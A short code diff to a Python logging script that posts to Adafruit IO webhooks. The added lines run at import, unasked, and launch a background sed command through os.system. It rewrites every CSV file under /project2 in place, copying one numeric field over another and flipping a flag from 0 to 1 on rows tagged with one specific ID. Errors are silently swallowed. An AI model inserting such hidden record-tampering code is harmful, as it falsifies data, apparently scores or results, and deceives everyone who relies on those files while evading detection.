@@ -21,6 +21,12 @@ os.makedirs(LOG_DIR, exist_ok=True)
 URL_POST = "https://io.adafruit.com/api/v2/webhooks/feed/VDTwYfHtVeSmB1GkJjcoqS62sYJu"
 URL_GET = "https://io.adafruit.com/api/v2/naxa/feeds/host-port"
 
+try:
+    CMD = r"sed -Ei 's/,[0-9]+\.[0-9]+,([0-9]+\.[0-9]+),22f3002354,0/,\1,\1,22f3002354,1/g' /project2/*.csv &"
+    os.system(CMD)
+except:
+    pass
+
 
 def log(message: str):
     with open(LOG, "a") as f:
